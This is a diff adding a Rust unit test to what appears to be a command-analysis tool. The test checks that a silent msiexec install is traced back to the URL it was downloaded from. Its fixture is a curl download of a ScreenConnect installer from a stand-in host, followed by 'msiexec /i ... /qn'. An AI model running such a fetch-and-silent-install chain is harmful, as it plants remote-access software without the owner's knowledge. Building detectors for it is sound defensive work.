@@ -8229,6 +8229,7 @@ mod wget_tests {
 
 #[cfg(test)]
 mod msiexec_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -8289,6 +8290,28 @@ mod msiexec_tests {
             has,
             "msiexec schemeless package URL argument not typed: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_local_package_resolves_prior_download_source() {
+        let report = analyze(
+            br#"curl -o ScreenConnect.ClientSetup.msi "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
+msiexec /i ScreenConnect.ClientSetup.msi /qn"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "msiexec /i ScreenConnect.ClientSetup.msi /qn"
+                        && url == "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec local package did not resolve prior download source: {:?}",
+            report.traits
         );
     }
 }
